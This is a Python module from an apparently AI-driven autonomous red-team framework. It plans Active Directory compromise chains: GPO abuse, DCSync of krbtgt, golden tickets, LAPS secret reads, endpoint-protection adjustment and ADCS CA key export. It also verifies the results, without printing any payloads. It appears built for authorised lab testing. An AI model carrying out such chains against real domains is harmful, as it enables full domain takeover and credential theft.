"""Generic autonomous capability planning helpers.

This module is intentionally pure: it consumes the existing EngagementState-shaped
object but does not call Mythic, BloodHound, Docker, or an LLM. GOAD should be a
fixture for these capabilities, not a source of hardcoded strategy.
"""

import ast
import base64
import hashlib
import re
import secrets
import xml.etree.ElementTree as ET
from dataclasses import dataclass, field, replace
from typing import Any, Callable, Iterable

# Per-run salt for offensive-artifact passwords (forged cert PFX, exported CA PFX). Randomized ONCE per Sage
# process so these passwords are NOT hardcoded source-visible constants an artifact recoverer could reuse,
# yet deterministic within a run+slug so the same artifact's forge step and use step agree on the password.
ARTIFACT_SECRET_SALT = secrets.token_hex(8)
DEFAULT_GPO_PROPAGATION_WAIT_SECONDS = 300
MAX_OPERATIONAL_WAIT_SECONDS = 600
_GPO_PROPAGATION_CAPABILITIES = frozenset({
    "gpo-controlled-system-exec",
    "grant-directory-rights",
})


def artifact_secret(prefix: str, slug: str = "") -> str:
    """A non-source-visible, per-run password for a forged/exported offensive artifact."""
    suffix = f"-{slug}" if slug else ""
    return f"{prefix}-{ARTIFACT_SECRET_SALT}{suffix}"


def _bounded_operational_wait_seconds(value: Any, *, default: int = 0) -> int:
    try:
        seconds = int(value)
    except (TypeError, ValueError):
        seconds = default
    return max(0, min(seconds, MAX_OPERATIONAL_WAIT_SECONDS))


def immediate_operational_cost(*, execution_scope: str = "direct") -> dict[str, Any]:
    """Return the explicit zero-wait cost profile for direct actions."""
    return {
        "interaction_class": "direct",
        "execution_scope": str(execution_scope or "direct"),
        "requires_propagation_wait": False,
        "expected_wait_seconds": 0,
        "wait_reasons": [],
    }


def gpo_operational_cost(wait_seconds: Any = DEFAULT_GPO_PROPAGATION_WAIT_SECONDS) -> dict[str, Any]:
    """Return the bounded propagation cost profile for GPO-backed actions."""
    return {
        "interaction_class": "propagation-bound",
        "execution_scope": "domain-policy",
        "requires_propagation_wait": True,
        "expected_wait_seconds": _bounded_operational_wait_seconds(
            wait_seconds,
            default=DEFAULT_GPO_PROPAGATION_WAIT_SECONDS,
        ),
        "wait_reasons": ["group-policy-refresh"],
    }


@dataclass(frozen=True)
class CapabilityAction:
    """A concrete, generic action candidate derived from observed state."""

    name: str
    target: str
    preconditions: list[str] = field(default_factory=list)
    effects: list[str] = field(default_factory=list)
    intent: dict[str, Any] = field(default_factory=dict)
    verifier: dict[str, list[str]] = field(default_factory=dict)
    reason: str = ""
    source_facts: list[str] = field(default_factory=list)
    operational_cost: dict[str, Any] = field(default_factory=immediate_operational_cost)

    def render_line(self) -> str:
        """Compact line for prompt injection."""
        pieces = [f"- {self.name} -> {self.target}"]
        if self.reason:
            pieces.append(self.reason)
        achieved = (self.verifier.get("achieved_any") or []) + (self.verifier.get("achieved_all") or [])
        if achieved:
            pieces.append("verify: " + " OR ".join(achieved))
        return " | ".join(pieces)


def normalize_operational_cost(value: Any) -> dict[str, Any]:
    """Normalize one candidate's policy-visible operational cost contract."""
    if not isinstance(value, dict):
        return immediate_operational_cost()
    raw_reasons = value.get("wait_reasons")
    if isinstance(raw_reasons, str):
        raw_reasons = [raw_reasons]
    elif not isinstance(raw_reasons, (list, tuple, set)):
        raw_reasons = []
    wait_seconds = _bounded_operational_wait_seconds(value.get("expected_wait_seconds"), default=0)
    requires_wait = value.get("requires_propagation_wait")
    if isinstance(requires_wait, str):
        requires_wait = requires_wait.strip().casefold() in {"1", "true", "yes", "on"}
    else:
        requires_wait = bool(requires_wait)
    requires_wait = requires_wait or wait_seconds > 0
    return {
        "interaction_class": str(
            value.get("interaction_class") or ("propagation-bound" if requires_wait else "direct")
        ),
        "execution_scope": str(
            value.get("execution_scope") or ("domain-policy" if requires_wait else "direct")
        ),
        "requires_propagation_wait": requires_wait,
        "expected_wait_seconds": wait_seconds,
        "wait_reasons": [str(reason) for reason in raw_reasons if str(reason)],
    }


def operational_cost_for_action(
    action: Any,
    *,
    gpo_wait_seconds: Any | None = None,
) -> dict[str, Any]:
    """Return the current policy-visible cost profile for one action."""
    action_name = str(getattr(action, "name", "") or "").strip().casefold()
    if action_name in _GPO_PROPAGATION_CAPABILITIES:
        return gpo_operational_cost(
            DEFAULT_GPO_PROPAGATION_WAIT_SECONDS if gpo_wait_seconds is None else gpo_wait_seconds
        )
    return normalize_operational_cost(getattr(action, "operational_cost", None))


def with_operational_cost(
    action: CapabilityAction,
    *,
    gpo_wait_seconds: Any | None = None,
) -> CapabilityAction:
    """Return an action whose cost metadata matches the current runtime wait configuration."""
    return replace(
        action,
        operational_cost=operational_cost_for_action(action, gpo_wait_seconds=gpo_wait_seconds),
    )


@dataclass(frozen=True)
class CapabilityVerification:
    verdict: str
    reason: str
    evidence: dict[str, Any] = field(default_factory=dict)


@dataclass(frozen=True)
class CapabilityExecutionStep:
    """A payload-agnostic execution primitive for a capability action."""

    operation: str
    parameters: dict[str, Any]
    capability: str
    purpose: str
    expected_probe: str
    prerequisites: list[str] = field(default_factory=list)


@dataclass(frozen=True)
class CapabilityExecutionPlan:
    ok: bool
    steps: list[CapabilityExecutionStep] = field(default_factory=list)
    missing: list[str] = field(default_factory=list)
    reason: str = ""


@dataclass(frozen=True)
class CapabilityTransaction:
    """Execution transaction obligations for a capability.

    This is intentionally generic: a capability is not complete because setup ran.
    It is complete only when required artifacts are valid and required effects are
    proven by verifier evidence.
    """

    capability: str
    target: str
    required_effects: list[str] = field(default_factory=list)
    artifact_obligations: list[str] = field(default_factory=list)
    delayed_effect_obligations: list[str] = field(default_factory=list)
    proof_obligations: list[str] = field(default_factory=list)


_CAPABILITY_CATALOG = (
    ("collect-graph", "Collect and ingest directory graph observations from an authorized foothold."),
    ("gpo-controlled-system-exec", "Use a controlled GPO to obtain verified SYSTEM execution."),
    ("grant-directory-rights", "Use verified SYSTEM execution to grant directory replication rights."),
    ("dcsync-krbtgt", "Retrieve krbtgt credential material using verified replication authority."),
    ("dcsync-account", "Retrieve required account credential material using verified replication authority."),
    ("forge-golden-ticket", "Create and apply a Kerberos ticket from verified domain key material."),
    ("ensure-kerberos-context", "Establish or refresh a callback-scoped Kerberos context for a domain."),
    ("ensure-account-kerberos-context", "Establish a callback-scoped Kerberos context for an account."),
    ("read-managed-local-admin-secret", "Read a graph-proven managed local administrator secret."),
    ("use-managed-local-admin-secret", "Use a managed local administrator secret on its authorized host."),
    ("execute-as-local-admin", "Turn verified local administrator access into a live execution context."),
    ("endpoint-protection-adjustment", "Apply a bounded endpoint protection change required by execution."),
    ("adcs-ca-private-key-export", "Export a CA private key from a verified administrative execution context."),
    ("adcs-esc-certificate-enroll", "Enroll a certificate through a graph-proven ADCS escalation path."),
    ("adcs-certificate-auth", "Authenticate with verified certificate material to obtain domain control."),
)


def capability_catalog() -> list[dict[str, str]]:
    """Return the semantic capability catalog without current-state admissibility."""
    return [
        {"name": name, "description": description}
        for name, description in _CAPABILITY_CATALOG
    ]


def actions_from_state(state: Any) -> list[CapabilityAction]:
    """Return generic capability actions available from the observed state."""
    actions: list[CapabilityAction] = []
    facts = _graph_fact_predicates(state)
    live_domains = _live_foothold_domains(state)
    live_callback_ids = _live_callback_ids(state)
    preferred_callback_id = _preferred_live_callback_id(state, live_callback_ids)
    achieved = _achieved_effects(state)
    available_account_contexts = achieved | _live_foothold_account_context_effects(state)
    terminal_failed = _terminal_failed_effects(state)
    ca_key_blocked_targets = _adcs_ca_private_key_blocked_targets(state)
    explicit_replication_domains = set(_replication_right_domains(achieved | facts))

    gpo_guids = _gpo_guid_map(facts)
    gpo_scope = _gpo_scope_map(facts)
    gpo_dc_scope = _gpo_dc_scope_map(facts)
    controlled_gpos = _controlled_gpos_with_domain(facts)
    system_exec_gpos = _system_exec_gpos(achieved)
    known_domains = {
        *live_domains,
        *explicit_replication_domains,
        *(domain for _, domain in controlled_gpos),
        *(domain for _, domain in system_exec_gpos),
    }
    admin_effects = _admin_domain_effects(achieved, known_domains)
    for canonical_domain, proof_effect in admin_effects.items():
        prefix = proof_effect.split(":", 1)[0]
        achieved.add(f"{prefix}:{canonical_domain}")
    admin_domains = set(admin_effects)
    unavailable_effects = achieved | terminal_failed

    for gpo, domain in controlled_gpos:
        if "*" not in live_domains and not any(
            _domains_equivalent(domain, live_domain) for live_domain in live_domains
        ):
            continue
        effect = f"system-exec:gpo:{gpo}@{domain}"
        if effect in achieved or effect in terminal_failed:
            continue
        if _gpo_downstream_effect_proves_progress(domain, achieved):
            continue
        legacy_note = ""
        if f"system:{gpo}" in achieved:
            legacy_note = "legacy gpo-abuse is recorded, but SYSTEM execution still needs proof"
        actions.append(
            _gpo_controlled_system_exec_action(
                gpo,
                domain,
                legacy_note,
                gpo_guids.get(gpo, ""),
                affected_hosts=gpo_scope.get((gpo, domain), []),
                affected_dc_hosts=gpo_dc_scope.get((gpo, domain), []),
            )
        )

    for gpo, domain in system_exec_gpos:
        if any(_domains_equivalent(domain, rights_domain) for rights_domain in explicit_replication_domains):
            continue
        if _gpo_downstream_effect_proves_progress(domain, achieved):
            continue
        actions.append(_grant_directory_rights_action(gpo, domain))

    for domain in sorted(explicit_replication_domains | admin_domains):
        if f"krbtgt-hash:{domain}" in achieved:
            continue
        context_callback, context_actions, context_required = _admin_dcsync_context_gate(
            domain,
            state,
            achieved,
            live_callback_ids,
            explicit_replication_domains,
            admin_effects,
            preferred_callback_id=preferred_callback_id,
            terminal_failed=terminal_failed,
        )
        if context_required:
            if context_actions:
                actions.extend(context_actions)
                continue
            if not context_callback:
                continue
            actions.append(_dcsync_krbtgt_action(domain, context_callback_id=context_callback))
            continue
        actions.append(_dcsync_krbtgt_action(domain))

    downstream_account_targets = _credential_accounts_required_by_downstream(
        facts,
        getattr(state, "objective", ""),
        achieved=available_account_contexts,
        terminal_failed=terminal_failed,
    )
    restrict_opportunistic_account_targets = (
        not downstream_account_targets
        and _objective_target_trusted_scope_pending(state)
    )

    for domain, account, source_fact in _credential_target_accounts(
        facts,
        unavailable_effects,
        getattr(state, "objective", ""),
        downstream_targets=downstream_account_targets,
        restrict_to_explicit=restrict_opportunistic_account_targets,
    ):
        effect = f"creds:{account}@{domain}"
        if effect in achieved or effect in terminal_failed:
            continue
        context_callback, context_actions, context_required = _admin_dcsync_context_gate(
            domain,
            state,
            achieved,
            live_callback_ids,
            explicit_replication_domains,
            admin_effects,
            preferred_callback_id=preferred_callback_id,
            terminal_failed=terminal_failed,
        )
        if context_required:
            if context_actions:
                actions.extend(context_actions)
                continue
            if not context_callback:
                continue
            actions.append(_dcsync_account_action(domain, account, context_callback_id=context_callback, source_fact=source_fact))
            continue
        if domain in explicit_replication_domains:
            actions.append(_dcsync_account_action(domain, account, source_fact=source_fact))

    for domain, account in _credential_material_accounts(achieved):
        if (
            downstream_account_targets
            and (domain, account) not in downstream_account_targets
        ):
            if not (
                _credential_material_is_admin_context_source(achieved, domain, account)
                and _credential_material_context_unblocks_progress(achieved, domain, account)
            ):
                continue
        elif not downstream_account_targets and not _credential_material_context_unblocks_progress(
            achieved,
            domain,
            account,
        ):
            continue
        if _live_account_kerberos_context_callbacks(available_account_contexts, live_callback_ids, domain, account):
            continue
        callback_id = _select_context_callback_id(
            live_callback_ids,
            preferred_callback_id,
            terminal_failed=terminal_failed,
            effect_for_callback=lambda candidate: _kerberos_account_context_effect(domain, account, candidate),
        )
        if callback_id:
            actions.append(_ensure_account_kerberos_context_action(domain, account, callback_id))

    for domain in _krbtgt_hash_domains(achieved):
        if domain not in admin_domains:
            continue
        if _live_kerberos_context_callback(domain, achieved, live_callback_ids):
            continue
        same_domain_callbacks = _live_callback_ids_for_domain(state, domain)
        if same_domain_callbacks:
            actions.extend(_refresh_kerberos_context_actions(
                domain,
                same_domain_callbacks,
                authorization_effect=admin_effects.get(domain, f"da:{domain}"),
                preferred_callback_id=preferred_callback_id,
                terminal_failed=terminal_failed,
            ))
        else:
            actions.extend(_ensure_kerberos_context_actions(
                domain,
                achieved,
                live_callback_ids,
                preferred_callback_id=preferred_callback_id,
                terminal_failed=terminal_failed,
            ))

    for target in _managed_local_admin_secret_targets(facts):
        account_domain, account, target_domain, target_host, source_fact = target
        if (
            downstream_account_targets
            and (account_domain, account) not in downstream_account_targets
        ):
            continue
        effect = _managed_local_admin_secret_effect(target_host, target_domain)
        if effect in achieved:
            continue
        for callback_id in _live_account_kerberos_context_callbacks(
            available_account_contexts,
            live_callback_ids,
            account_domain,
            account,
        ):
            actions.append(_read_managed_local_admin_secret_action(
                account_domain,
                account,
                target_domain,
                target_host,
                callback_id,
                source_fact=source_fact,
            ))

    for target_domain, target_host in _managed_local_admin_secret_effect_targets(achieved):
        host = _normalize(_host_short(target_host))
        effect = _local_admin_effect(host, target_domain)
        if effect in achieved or f"admin:{host}" in achieved or f"system-or-admin:{host}" in achieved:
            continue
        for callback_id in sorted(live_callback_ids):
            actions.append(_use_managed_local_admin_secret_action(target_domain, host, callback_id))

    for target_domain, target_host in _local_admin_effect_targets(achieved):
        effect = _remote_exec_effect(target_host, target_domain)
        if effect in achieved:
            continue
        for callback_id in sorted(live_callback_ids):
            actions.append(_execute_as_local_admin_action(target_domain, target_host, callback_id))

    for target_domain, target_host in _remote_exec_effect_targets(achieved):
        if _endpoint_protection_adjusted_effect(target_host, target_domain) not in achieved:
            for blocked_domain, blocked_host in _endpoint_protection_blocked_targets(state):
                if blocked_domain == target_domain and _host_short(blocked_host) == _host_short(target_host):
                    for callback_id in sorted(live_callback_ids):
                        actions.append(_endpoint_protection_adjustment_action(target_domain, target_host, callback_id))
                    break

    for target_domain, target_host in _remote_exec_effect_targets(achieved):
        effect = _adcs_ca_private_key_effect(target_host, target_domain)
        if effect in achieved:
            continue
        if (target_domain, _normalize(_host_short(target_host))) in ca_key_blocked_targets:
            continue
        for callback_id in sorted(live_callback_ids):
            actions.append(_adcs_ca_private_key_export_action(target_domain, target_host, callback_id))

    for target_domain, target_host in sorted(ca_key_blocked_targets):
        if f"da:{target_domain}" in achieved:
            continue
        for account in _certificate_auth_target_accounts(facts, unavailable_effects, target_domain):
            enrolled_effect = _adcs_enrolled_certificate_effect(account, target_domain)
            if enrolled_effect in achieved:
                continue
            for callback_id in sorted(live_callback_ids):
                actions.append(_adcs_esc_certificate_enroll_action(
                    target_domain,
                    target_host,
                    account,
                    callback_id,
                ))

    for target_domain, target_host in _adcs_ca_private_key_effect_targets(achieved):
        if f"da:{target_domain}" in achieved:
            continue
        for account in _certificate_auth_target_accounts(facts, unavailable_effects, target_domain):
            for callback_id in sorted(live_callback_ids):
                actions.append(_adcs_certificate_auth_action(target_domain, target_host, account, callback_id))

    for target_domain, account in _adcs_enrolled_certificate_effect_targets(achieved):
        if f"certificate-auth:{account}@{target_domain}" in achieved:
            continue
        for callback_id in sorted(live_callback_ids):
            actions.append(_adcs_certificate_auth_from_enrolled_certificate_action(target_domain, account, callback_id))

    for domain in _krbtgt_hash_domains(achieved | facts):
        parent_domain = _parent_domain(domain)
        if parent_domain != domain and f"da:{parent_domain}" not in achieved:
            actions.append(_forge_golden_ticket_action(domain, target_domain=parent_domain))
        if f"da:{domain}" not in achieved:
            actions.append(_forge_golden_ticket_action(domain))

    actions = _dedupe_actions(actions)
    actions.sort(key=lambda action: _capability_action_sort_key(action, preferred_callback_id))
    return actions


def render_capability_actions(state: Any, limit: int = 5) -> list[str]:
    """Return prompt lines for available generic capability actions."""
    actions = actions_from_state(state)
    if not actions:
        return []
    lines = [
        "NEXT CAPABILITY ACTIONS (generic; derive from observed state, not a range script):",
    ]
    lines.extend(action.render_line() for action in actions[:max(1, int(limit or 1))])
    return lines


def build_capability_execution_plan(
    action: CapabilityAction,
    inputs: dict[str, Any] | None = None,
) -> CapabilityExecutionPlan:
    """Build deterministic, payload-agnostic execution steps for a capability action.

    Runtime values that cannot be safely inferred from the graph, such as the
    principal receiving a DCSync ACE, must be supplied in ``inputs``. Missing
    runtime values fail closed instead of emitting placeholder tradecraft.
    """
    values = inputs if isinstance(inputs, dict) else {}
    capability = _normalize(action.intent.get("capability") or action.name)
    if capability == "dcsync":
        fields = _target_fields(action.target)
        account = _normalize(
            _input_text(values, "account", "user", "target_account")
            or action.intent.get("account")
            or action.intent.get("user")
            or fields.get("account")
            or "krbtgt"
        )
        capability = "dcsync-krbtgt" if account == "krbtgt" else "dcsync-account"
    if capability == "gpo-controlled-system-exec":
        return _build_gpo_system_exec_execution_plan(action, values)
    if capability == "grant-directory-rights":
        return _build_grant_directory_rights_execution_plan(action, values)
    if capability in {"dcsync-krbtgt", "dcsync-account"}:
        return _build_dcsync_krbtgt_execution_plan(action, values)
    if capability == "forge-golden-ticket":
        return _build_forge_golden_ticket_execution_plan(action, values)
    if capability == "ensure-kerberos-context":
        return _build_ensure_kerberos_context_execution_plan(action, values)
    if capability == "ensure-account-kerberos-context":
        return _build_ensure_account_kerberos_context_execution_plan(action, values)
    if capability == "read-managed-local-admin-secret":
        return _build_read_managed_local_admin_secret_execution_plan(action, values)
    if capability == "use-managed-local-admin-secret":
        return _build_use_managed_local_admin_secret_execution_plan(action, values)
    if capability == "execute-as-local-admin":
        return _build_execute_as_local_admin_execution_plan(action, values)
    if capability == "endpoint-protection-adjustment":
        return _build_endpoint_protection_adjustment_execution_plan(action, values)
    if capability == "adcs-ca-private-key-export":
        return _build_adcs_ca_private_key_export_execution_plan(action, values)
    if capability == "adcs-esc-certificate-enroll":
        return _build_adcs_esc_certificate_enroll_execution_plan(action, values)
    if capability == "adcs-certificate-auth":
        return _build_adcs_certificate_auth_execution_plan(action, values)
    return CapabilityExecutionPlan(False, missing=["capability"], reason=f"no execution builder for {action.name}")


def verify_gpo_controlled_system_exec(probe_result: dict[str, Any]) -> CapabilityVerification:
    """Classify a structured post-action probe for GPO-controlled SYSTEM execution.

    Achieved means a SYSTEM context was actually observed. GPO/SYSVOL artifacts
    alone are partial; they are necessary setup, not proof of execution.
    """
    if not isinstance(probe_result, dict):
        return CapabilityVerification("failed", "probe result is not structured")

    if _any_true(probe_result, ("system_callback_observed", "system_command_succeeded")):
        return CapabilityVerification(
            "achieved",
            "SYSTEM execution observed",
            _selected_probe(probe_result),
        )

    blocker = _first_true(
        probe_result,
        (
            "defender_blocked",
            "payload_quarantined",
            "xml_invalid",
            "xml_empty",
            "xml_save_locked",
            "gpupdate_failed",
            "command_path_missing",
        ),
    )
    if blocker:
        return CapabilityVerification("blocked", blocker.replace("_", " "), _selected_probe(probe_result))

    if probe_result.get("proof_not_found") is True:
        return CapabilityVerification(
            "partial",
            "GPO execution proof is not available yet",
            _selected_probe(probe_result),
        )

    setup_keys = (
        "scheduled_task_xml_valid",
        "gpt_ini_version_bumped",
        "ldap_version_bumped",
        "command_path_present",
    )
    if all(probe_result.get(key) is True for key in setup_keys):
        return CapabilityVerification(
            "partial",
            "GPO execution artifacts are staged, but SYSTEM execution is not yet observed",
            _selected_probe(probe_result),
        )
    if _any_true(probe_result, setup_keys + ("gpupdate_completed", "cse_extension_registered")):
        return CapabilityVerification(
            "partial",
            "some GPO execution artifacts are present",
            _selected_probe(probe_result),
        )
    return CapabilityVerification("failed", "no SYSTEM execution evidence", _selected_probe(probe_result))


def verify_grant_directory_rights(probe_result: dict[str, Any]) -> CapabilityVerification:
    """Classify a structured ACL/right probe for directory-rights grants.

    Achieved requires explicit DS-Replication-right evidence. Named rights without
    an applied/confirmed marker are partial, and denied/no-output cases are failed.
    """
    if not isinstance(probe_result, dict):
        return CapabilityVerification("failed", "probe result is not structured")

    if probe_result.get("ds_replication_rights") is True:
        return CapabilityVerification(
            "achieved",
            "DS-Replication rights verified on target ACL",
            _selected_probe(probe_result),
        )

    blocker = _first_true(
        probe_result,
        (
            "access_denied",
            "principal_not_found",
            "target_not_found",
            "acl_write_failed",
            "execution_context_missing",
        ),
    )
    if blocker:
        return CapabilityVerification("blocked", blocker.replace("_", " "), _selected_probe(probe_result))

    partial_keys = (
        "ace_present",
        "get_changes",
        "get_changes_all",
        "get_changes_in_filtered_set",
    )
    if _any_true(probe_result, partial_keys):
        return CapabilityVerification(
            "partial",
            "replication right names observed, but full DS-Replication rights are not verified",
            _selected_probe(probe_result),
        )
    return CapabilityVerification("failed", "no DS-Replication rights evidence", _selected_probe(probe_result))


def verify_dcsync_secret(probe_result: dict[str, Any]) -> CapabilityVerification:
    """Classify a structured DCSync probe.

    Achieved requires a real extracted secret. Connection/start markers are only
    partial because they do not prove Sage can forge/use anything.
    """
    if not isinstance(probe_result, dict):
        return CapabilityVerification("failed", "probe result is not structured")

    if _any_true(probe_result, ("krbtgt_hash_present", "credentials_dumped")):
        return CapabilityVerification(
            "achieved",
            "DCSync secret material verified",
            _selected_probe(probe_result),
        )

    blocker = _first_true(
        probe_result,
        (
            "replication_access_denied",
            "access_denied",
            "bad_dn",
            "principal_not_found",
            "target_not_found",
            "dc_unreachable",
        ),
    )
    if blocker:
        return CapabilityVerification("blocked", blocker.replace("_", " "), _selected_probe(probe_result))

    if _any_true(probe_result, ("secretsdump_connected", "dcsync_started", "domain_hashes_dumped")):
        return CapabilityVerification(
            "partial",
            "DCSync ran or connected, but no usable secret was verified",
            _selected_probe(probe_result),
        )
    return CapabilityVerification("failed", "no DCSync secret evidence", _selected_probe(probe_result))


def verify_forged_ticket(probe_result: dict[str, Any]) -> CapabilityVerification:
    """Classify a structured probe for a forged Kerberos ticket.

    Achieved means the ticket is proven usable, not merely that a forge command
    printed success.
    """
    if not isinstance(probe_result, dict):
        return CapabilityVerification("failed", "probe result is not structured")

    if _any_true(probe_result, ("ticket_valid", "domain_admin")):
        return CapabilityVerification("achieved", "forged ticket proved usable", _selected_probe(probe_result))

    blocker = _first_true(
        probe_result,
        (
            "bad_krbtgt_key",
            "bad_domain_sid",
            "clock_skew",
            "ticket_injection_failed",
            "logon_context_failed",
            "kdc_rejected",
            "access_denied",
        ),
    )
    if blocker:
        return CapabilityVerification("blocked", blocker.replace("_", " "), _selected_probe(probe_result))

    if _any_true(probe_result, ("service_access_proven", "ticket_forged", "tgt_present", "ticket_imported", "ticket_context_created")):
        return CapabilityVerification(
            "partial",
            "ticket was forged or staged, but usable access is not verified",
            _selected_probe(probe_result),
        )
    return CapabilityVerification("failed", "no forged ticket evidence", _selected_probe(probe_result))


def verify_kerberos_context(probe_result: dict[str, Any]) -> CapabilityVerification:
    """Classify a structured probe for a callback-scoped Kerberos execution context.

    This is stricter than a durable ticket proof: achieved requires usable access
    and the callback id that holds the context. That prevents a proof from a dead
    callback from unlocking future DCSync attempts on another callback.
    """
    if not isinstance(probe_result, dict):
        return CapabilityVerification("failed", "probe result is not structured")

    callback_id = _input_text(probe_result, "callback_id", "callback", "callback_display_id")
    if _any_true(probe_result, ("ticket_valid", "domain_admin", "service_access_proven")):
        if callback_id:
            return CapabilityVerification("achieved", "Kerberos context proved usable on callback", _selected_probe(probe_result))
        return CapabilityVerification(
            "partial",
            "Kerberos access was proven, but the holding callback id is missing",
            _selected_probe(probe_result),
        )

    blocker = _first_true(
        probe_result,
        (
            "bad_krbtgt_key",
            "bad_domain_sid",
            "clock_skew",
            "ticket_injection_failed",
            "logon_context_failed",
            "kdc_rejected",
            "access_denied",
            "callback_dead",
        ),
    )
    if blocker:
        return CapabilityVerification("blocked", blocker.replace("_", " "), _selected_probe(probe_result))

    if _any_true(probe_result, ("ticket_forged", "tgt_present", "ticket_imported", "ticket_context_created")):
        return CapabilityVerification(
            "partial",
            "Kerberos context was staged, but usable access is not verified",
            _selected_probe(probe_result),
        )
    return CapabilityVerification("failed", "no Kerberos context evidence", _selected_probe(probe_result))


def verify_account_kerberos_context(probe_result: dict[str, Any]) -> CapabilityVerification:
    """Classify proof that a callback holds a usable Kerberos context for a specific account."""
    if not isinstance(probe_result, dict):
        return CapabilityVerification("failed", "probe result is not structured")

    callback_id = _input_text(probe_result, "callback_id", "callback", "callback_display_id")
    account = _normalize(_input_text(probe_result, "account", "user", "principal"))
    domain = _normalize(_input_text(probe_result, "domain", "realm"))
    account_ticket = _any_true(
        probe_result,
        ("account_ticket_present", "ticket_client_matches_account", "expected_account_ticket_present"),
    )
    access_proof = _any_true(probe_result, ("ticket_valid", "service_access_proven", "ldap_access_proven"))
    context_proof = _any_true(probe_result, ("logon_context_proven", "account_context_proven"))
    if access_proof and callback_id and account and domain and account_ticket and context_proof:
        return CapabilityVerification(
            "achieved",
            "account Kerberos context proved usable on callback",
            _selected_probe(probe_result),
        )
    if access_proof and callback_id and account_ticket:
        return CapabilityVerification(
            "partial",
            "account ticket and service access were observed, but the active logon context was not proven",
            _selected_probe(probe_result),
        )
    if access_proof and callback_id:
        return CapabilityVerification(
            "partial",
            "service access was proven, but the expected account ticket was not observed",
            _selected_probe(probe_result),
        )

    blocker = _first_true(
        probe_result,
        (
            "bad_key",
            "clock_skew",
            "ticket_injection_failed",
            "logon_context_failed",
            "kdc_rejected",
            "access_denied",
            "callback_dead",
        ),
    )
    if blocker:
        return CapabilityVerification("blocked", blocker.replace("_", " "), _selected_probe(probe_result))

    if _any_true(probe_result, ("tgt_present", "ticket_imported", "ticket_context_created", "account_ticket_present")):
        return CapabilityVerification(
            "partial",
            "account Kerberos context was staged, but usable account-scoped access is not verified",
            _selected_probe(probe_result),
        )
    return CapabilityVerification("failed", "no account Kerberos context evidence", _selected_probe(probe_result))


def verify_managed_local_admin_secret(probe_result: dict[str, Any]) -> CapabilityVerification:
    """Classify proof that a managed local admin secret was actually disclosed."""
    if not isinstance(probe_result, dict):
        return CapabilityVerification("failed", "probe result is not structured")

    callback_id = _input_text(probe_result, "callback_id", "callback", "callback_display_id")
    target_host = _normalize(_input_text(probe_result, "target_host", "host", "computer", "target"))
    target_domain = _normalize(_input_text(probe_result, "target_domain", "domain", "realm"))
    secret_present = _any_true(
        probe_result,
        (
            "managed_local_admin_secret_present",
            "legacy_laps_password_present",
            "windows_laps_password_present",
            "credential_store_secret_present",
        ),
    )
    if secret_present and callback_id and target_host and target_domain:
        return CapabilityVerification(
            "achieved",
            "managed local admin secret material verified",
            _selected_probe(probe_result),
        )
    if secret_present:
        return CapabilityVerification(
            "partial",
            "managed local admin secret was present, but callback or target identity is missing",
            _selected_probe(probe_result),
        )

    blocker = _first_true(
        probe_result,
        (
            "access_denied",
            "ldap_bind_failed",
            "directory_unreachable",
            "target_not_found",
            "wrong_kerberos_context",
        ),
    )
    if blocker:
        return CapabilityVerification("blocked", blocker.replace("_", " "), _selected_probe(probe_result))

    if _any_true(
        probe_result,
        (
            "computer_object_found",
            "laps_metadata_present",
            "encrypted_laps_blob_present",
            "directory_query_succeeded",
        ),
    ):
        return CapabilityVerification(
            "partial",
            "directory object was readable, but no usable managed local admin secret was disclosed",
            _selected_probe(probe_result),
        )
    return CapabilityVerification("failed", "no managed local admin secret evidence", _selected_probe(probe_result))


def verify_local_admin_access(probe_result: dict[str, Any]) -> CapabilityVerification:
    """Classify proof that a recovered local admin secret provides remote admin access."""
    if not isinstance(probe_result, dict):
        return CapabilityVerification("failed", "probe result is not structured")

    callback_id = _input_text(probe_result, "callback_id", "callback", "callback_display_id")
    target_host = _normalize(_input_text(probe_result, "target_host", "host", "computer", "target"))
    target_domain = _normalize(_input_text(probe_result, "target_domain", "domain", "realm"))
    access_proven = _any_true(
        probe_result,
        (
            "local_admin_access_proven",
            "admin_share_access_proven",
            "service_access_proven",
        ),
    )
    if access_proven and callback_id and target_host and target_domain:
        return CapabilityVerification(
            "achieved",
            "managed local admin secret proved remote admin access",
            _selected_probe(probe_result),
        )
    if access_proven:
        return CapabilityVerification(
            "partial",
            "local admin access was proven, but callback or target identity is missing",
            _selected_probe(probe_result),
        )

    blocker = _first_true(
        probe_result,
        (
            "access_denied",
            "logon_failure",
            "bad_password",
            "network_path_not_found",
            "host_unreachable",
            "callback_dead",
        ),
    )
    if blocker:
        return CapabilityVerification("blocked", blocker.replace("_", " "), _selected_probe(probe_result))

    if _any_true(probe_result, ("logon_context_created", "credential_accepted")):
        return CapabilityVerification(
            "partial",
            "local admin logon context was staged, but remote admin access is not verified",
            _selected_probe(probe_result),
        )
    return CapabilityVerification("failed", "no local admin access evidence", _selected_probe(probe_result))


def verify_remote_execution(probe_result: dict[str, Any]) -> CapabilityVerification:
    """Classify proof that local-admin rights executed a command on the target host."""
    if not isinstance(probe_result, dict):
        return CapabilityVerification("failed", "probe result is not structured")

    callback_id = _input_text(probe_result, "callback_id", "callback", "callback_display_id")
    target_host = _normalize(_input_text(probe_result, "target_host", "host", "computer", "target"))
    target_domain = _normalize(_input_text(probe_result, "target_domain", "domain", "realm"))
    access_proven = _any_true(
        probe_result,
        (
            "remote_execution_proven",
            "remote_command_output_proven",
            "proof_file_read",
        ),
    )
    if access_proven and callback_id and target_host and target_domain:
        return CapabilityVerification(
            "achieved",
            "remote execution proof was read from the target host",
            _selected_probe(probe_result),
        )
    if access_proven:
        return CapabilityVerification(
            "partial",
            "remote execution proof exists, but callback or target identity is missing",
            _selected_probe(probe_result),
        )

    blocker = _first_true(
        probe_result,
        (
            "access_denied",
            "logon_failure",
            "bad_password",
            "wmi_unavailable",
            "rpc_unavailable",
            "network_path_not_found",
            "proof_not_found",
            "execution_failed",
            "account_locked",
            "callback_dead",
        ),
    )
    if blocker:
        return CapabilityVerification("blocked", blocker.replace("_", " "), _selected_probe(probe_result))

    if _any_true(probe_result, ("remote_process_created", "proof_file_present", "credential_accepted")):
        return CapabilityVerification(
            "partial",
            "remote execution was submitted, but target-side proof is not verified",
            _selected_probe(probe_result),
        )
    return CapabilityVerification("failed", "no remote execution evidence", _selected_probe(probe_result))


def verify_adcs_ca_private_key_export(probe_result: dict[str, Any]) -> CapabilityVerification:
    """Classify proof that an ADCS CA signing certificate/private key was exported.

    Achieved requires real PFX/private-key material plus CA certificate metadata.
    A remote process success or CA subject alone is partial because neither proves
    that Sage has a usable signing-key artifact for follow-on certificate abuse.
    """
